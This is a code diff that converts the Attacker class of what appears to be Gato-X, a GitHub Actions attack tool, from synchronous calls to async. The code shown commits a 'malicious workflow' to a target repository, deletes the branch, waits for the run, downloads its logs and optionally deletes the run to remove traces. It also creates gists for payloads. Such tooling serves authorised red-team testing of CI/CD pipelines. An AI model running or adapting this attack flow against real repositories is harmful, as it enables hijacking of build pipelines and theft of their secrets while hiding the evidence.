@@ -1,7 +1,7 @@
 import logging
-import time
 import random
 import string
+import asyncio
 
 from gatox.github.api import Api
 from gatox.attack.cicd_attack import CICDAttack
@@ -42,10 +42,10 @@ class Attacker:
         self.timeout = timeout
         self.github_url = github_url
 
-    def setup_user_info(self):
+    async def setup_user_info(self):
         """ """
         if not self.user_perms:
-            self.user_perms = self.api.check_user()
+            self.user_perms = await self.api.check_user()
             if not self.user_perms:
                 logger.error("This token cannot be used for attacks!")
                 return False
@@ -69,9 +69,9 @@ class Attacker:
 
         return True
 
-    def create_gist(self, gist_name: str, gist_contents: str):
+    async def create_gist(self, gist_name: str, gist_contents: str):
         """Create a Gist with the specified contents and return the raw URL."""
-        self.setup_user_info()
+        await self.setup_user_info()
 
         if "gist" not in self.user_perms["scopes"]:
             Output.error("Unable to create Gist without gist scope!")
@@ -83,7 +83,7 @@ class Attacker:
             "files": {f"{gist_name}-{random_id}": {"content": gist_contents}}
         }
 
-        result = self.api.call_post("/gists", params=gist_params)
+        result = await self.api.call_post("/gists", params=gist_params)
 
         if result.status_code == 201:
             return (
@@ -93,7 +93,7 @@ class Attacker:
         else:
             Output.error("Failed to create Gist!")
 
-    def execute_and_wait_workflow(
+    async def execute_and_wait_workflow(
         self,
         target_repo: str,
         branch: str,
@@ -119,7 +119,7 @@ class Attacker:
         workflow_id = None
 
         if self.author_email and self.author_name:
-            rev_hash = self.api.commit_workflow(
+            rev_hash = await self.api.commit_workflow(
                 target_repo,
                 branch,
                 yaml_contents.encode(),
@@ -129,7 +129,7 @@ class Attacker:
                 message=commit_message,
             )
         else:
-            rev_hash = self.api.commit_workflow(
+            rev_hash = await self.api.commit_workflow(
                 target_repo,
                 branch,
                 yaml_contents.encode(),
@@ -143,12 +143,12 @@ class Attacker:
 
         Output.result("Succesfully pushed the malicious workflow!")
 
-        for i in range(self.timeout):
-            ret = self.api.delete_branch(target_repo, branch)
+        for _ in range(self.timeout):
+            ret = await self.api.delete_branch(target_repo, branch)
             if ret:
                 break
             else:
-                time.sleep(1)
+                await asyncio.sleep(1)
 
         if ret:
             Output.result("Malicious branch deleted.")
@@ -158,22 +158,24 @@ class Attacker:
         Output.tabbed("Waiting for the workflow to queue...")
 
         for i in range(self.timeout):
-            workflow_id = self.api.get_recent_workflow(target_repo, rev_hash, yaml_name)
+            workflow_id = await self.api.get_recent_workflow(
+                target_repo, rev_hash, yaml_name
+            )
             if workflow_id == -1:
                 Output.error("Failed to find the created workflow!")
                 return
             elif workflow_id > 0:
                 break
             else:
-                time.sleep(1)
+                await asyncio.sleep(1)
         else:
             Output.error("Failed to find the created workflow!")
             return
 
         Output.tabbed("Waiting for the workflow to execute...")
 
-        for i in range(self.timeout):
-            status = self.api.get_workflow_status(target_repo, workflow_id)
+        for _ in range(self.timeout):
+            status = await self.api.get_workflow_status(target_repo, workflow_id)
             if status == -1:
                 Output.error("The workflow failed!")
                 break
@@ -181,13 +183,13 @@ class Attacker:
                 Output.result("The malicious workflow executed succesfully!")
                 break
             else:
-                time.sleep(1)
+                await asyncio.sleep(1)
         else:
             Output.error("The workflow is incomplete but hit the timeout!")
 
         return workflow_id
 
-    def push_workflow_attack(
+    async def push_workflow_attack(
         self,
         target_repo,
         payload: str,
@@ -198,7 +200,7 @@ class Attacker:
         yaml_name: str = "sh_cicd_attack",
     ):
 
-        self.setup_user_info()
+        await self.setup_user_info()
 
         if not self.user_perms:
             return False
@@ -220,7 +222,7 @@ class Attacker:
             else:
                 branch = target_branch
 
-            res = self.api.get_repo_branch(target_repo, branch)
+            res = await self.api.get_repo_branch(target_repo, branch)
             if res == -1:
                 Output.error("Failed to check for remote branch!")
                 return
@@ -234,18 +236,18 @@ class Attacker:
             else:
                 yaml_contents = CICDAttack.create_push_yml(payload, branch)
 
-            workflow_id = self.execute_and_wait_workflow(
+            workflow_id = await self.execute_and_wait_workflow(
                 target_repo, branch, yaml_contents, commit_message, yaml_name
             )
 
-            res = self.api.download_workflow_logs(target_repo, workflow_id)
+            res = await self.api.download_workflow_logs(target_repo, workflow_id)
             if not res:
                 Output.error("Failed to download logs!")
             else:
                 Output.result(f"Workflow logs downloaded to {workflow_id}.zip!")
 
             if delete_action:
-                res = self.api.delete_workflow_run(target_repo, workflow_id)
+                res = await self.api.delete_workflow_run(target_repo, workflow_id)
                 if not res:
                     Output.error("Failed to delete workflow!")
                 else:
